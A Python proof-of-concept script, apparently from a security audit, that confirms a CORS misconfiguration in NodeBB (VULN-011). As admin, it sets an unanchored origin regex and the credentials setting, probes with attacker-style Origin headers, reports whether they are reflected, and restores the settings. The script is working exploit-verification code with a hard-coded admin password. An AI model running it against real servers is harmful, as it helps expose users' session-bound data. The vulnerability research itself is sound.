#!/usr/bin/env python3
r"""
VULN-011 — CORS: unanchored admin regex + credentialed origin reflection (config-gated)
=======================================================================================

Vulnerable code (targets/NodeBB/):
  * src/middleware/headers.js:42-59  regex.test(req.get('origin'))  -> UNANCHORED substring match;
                                      reflects encodeURI(origin) into Access-Control-Allow-Origin
  * src/middleware/headers.js:65-66  Access-Control-Allow-Credentials emitted INDEPENDENTLY

Vulnerability class: CWE-942 / CWE-346 (CORS misconfiguration / origin reflection).

Flaw (plain English):
  When an admin sets `access-control-allow-origin-regex` (e.g. `example\.com`), NodeBB compiles it with
  new RegExp() and tests the request Origin with an UNANCHORED `.test()` — so it matches any origin
  that merely CONTAINS the pattern (e.g. https://example.com.attacker.net, https://notexample.com).
  The matched Origin is reflected verbatim, and `access-control-allow-credentials: true` is emitted
  alongside it. A browser will then allow an attacker page to read authenticated, credentialed JSON
  cross-origin — including /api/config, which contains the session-bound csrf_token.

Exploitation idea:
  As admin, enable the two settings (a supported ACP config). Then, unauthenticated, send requests with
  attacker Origins and observe the reflected ACAO + ACAC. Restore the config afterward.

What a successful run proves:
  Attacker origins that merely contain the configured substring are reflected into
  Access-Control-Allow-Origin together with Access-Control-Allow-Credentials: true (a control origin
  that does NOT contain the substring is NOT reflected) -> credentialed cross-origin reads are allowed.
"""
import os
import sys
import requests

BASE_URL = os.environ.get("BASE_URL", "http://localhost:21372")
ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
ADMIN_PASS = os.environ.get("ADMIN_PASS", "NodeBB-Adm1n-Sec2026!")
TIMEOUT = 10
BROWSER_UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
REGEX_KEY = "access-control-allow-origin-regex"
CRED_KEY = "access-control-allow-credentials"

_USE_COLOR = sys.stdout.isatty() and not os.environ.get("NO_COLOR")
_C = {"INFO": "36", "SETUP": "33", "STEP": "33", "PROOF": "35", "OK": "32", "FAIL": "31"}


def log(tag, msg):
    if _USE_COLOR and tag in _C:
        print(f"\033[1;{_C[tag]}m[{tag}]\033[0m {msg}")
    else:
        print(f"[{tag}] {msg}")


def admin_session():
    s = requests.Session()
    s.headers["User-Agent"] = BROWSER_UA
    csrf = s.get(f"{BASE_URL}/api/config", timeout=TIMEOUT).json()["csrf_token"]
    s.post(f"{BASE_URL}/login", headers={"x-csrf-token": csrf},
           data={"username": ADMIN_USER, "password": ADMIN_PASS}, timeout=TIMEOUT).raise_for_status()
    csrf = s.get(f"{BASE_URL}/api/config", timeout=TIMEOUT).json()["csrf_token"]
    return s, csrf


def set_setting(s, csrf, key, value):
    r = s.put(f"{BASE_URL}/api/v3/admin/settings/{key}", headers={"x-csrf-token": csrf,
              "Content-Type": "application/json"}, json={"value": value}, timeout=TIMEOUT)
    return r.status_code


def probe_origin(origin):
    """Unauthenticated preflight-style probe; return (ACAO, ACAC)."""
    r = requests.get(f"{BASE_URL}/api/config", headers={"User-Agent": BROWSER_UA, "Origin": origin},
                     timeout=TIMEOUT)
    return r.headers.get("Access-Control-Allow-Origin"), r.headers.get("Access-Control-Allow-Credentials")


def main():
    print("=" * 78)
    print("VULN-011: CORS unanchored regex + credentialed origin reflection (config-gated)")
    print(f"Target: {BASE_URL}")
    print("=" * 78)
    log("INFO", "src/middleware/headers.js:42-66 — unanchored regex.test(origin), reflects origin + credentials")

    attacker_origins = ["https://example.com.attacker.net", "https://notexample.com"]
    control_origin = "https://unrelated-evil.org"   # does NOT contain 'example.com' -> must NOT be reflected

    s, csrf = admin_session()
    log("SETUP", "reading current CORS settings to restore later")
    cfg = s.get(f"{BASE_URL}/api/config", timeout=TIMEOUT).json()
    # values live in meta.config; fetch via admin settings read is not trivial, default is empty
    orig_regex = cfg.get(REGEX_KEY, "")
    orig_cred = cfg.get(CRED_KEY, "")

    ok = False
    try:
        log("SETUP", f"admin enables {REGEX_KEY}=`example\\.com` and {CRED_KEY}=`true` (a supported ACP setting)")
        c1 = set_setting(s, csrf, REGEX_KEY, r"example\.com")
        c2 = set_setting(s, csrf, CRED_KEY, "true")
        log("INFO", f"settings applied (HTTP {c1}, {c2})")

        results = {}
        for o in attacker_origins:
            acao, acac = probe_origin(o)
            results[o] = (acao, acac)
            log("STEP", f"probe Origin: {o}")
            log("INFO", f"  Access-Control-Allow-Origin: {acao!r} | Access-Control-Allow-Credentials: {acac!r}")
        acao_c, acac_c = probe_origin(control_origin)
        log("STEP", f"control Origin (no 'example.com' substring): {control_origin}")
        log("INFO", f"  Access-Control-Allow-Origin: {acao_c!r} (should be None/not-reflected)")

        attacker_reflected = all(results[o][0] == o and (results[o][1] or "").lower() == "true"
                                 for o in attacker_origins)
        control_not_reflected = (acao_c != control_origin)

        if attacker_reflected and control_not_reflected:
            log("PROOF", "attacker origins that merely CONTAIN 'example.com' are reflected into ACAO with "
                         "ACAC:true, while an unrelated origin is not -> credentialed cross-origin read allowed "
                         "(e.g. exfiltrate /api/config csrf_token)")
            ok = True
        else:
            log("FAIL", f"reflection not as expected (attacker_reflected={attacker_reflected}, "
                        f"control_not_reflected={control_not_reflected})")
    finally:
        log("SETUP", "restoring original CORS settings")
        set_setting(s, csrf, REGEX_KEY, orig_regex)
        set_setting(s, csrf, CRED_KEY, orig_cred)
        log("INFO", "CORS settings restored")

    print("-" * 78)
    if ok:
        log("OK", "exploit confirmed — unanchored CORS regex reflects attacker origins with credentials")
        v = "==> VULN-011: CONFIRMED — unanchored CORS regex + credentialed reflection (config-gated)"
        print(f"\033[1;32m{v}\033[0m" if _USE_COLOR else v)
        sys.exit(0)
    v = "==> VULN-011: FAILED — CORS reflection not reproduced"
    print(f"\033[1;31m{v}\033[0m" if _USE_COLOR else v)
    sys.exit(1)


if __name__ == "__main__":
    main()
